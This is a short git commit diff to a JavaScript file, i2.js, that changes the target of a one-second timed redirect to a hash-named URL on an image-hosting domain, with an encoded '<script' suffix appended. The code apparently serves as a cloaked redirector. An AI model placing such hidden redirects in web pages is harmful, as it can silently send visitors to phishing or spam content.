6c2f9c2517e3e39b1d1b9fbfd43f55af57fa5f11
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-11 10:37:47 +0800

    Update i2.js

--- i2.js
+++ i2.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://meeting-75420.picgzc.qpic.cn/8f81703c1c76fe689f5ee64c0a059dd0bec71e7fbb6f7dbe6c4d74e1ca88260b' + '?' + timestamp + '%3Cscript';
+    var url = 'https://meeting-75420.picgzc.qpic.cn/a3db69872e35de46b3f8fca262dfbd1a2daea20631cdeaaaf4cd8d28773bc91d' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
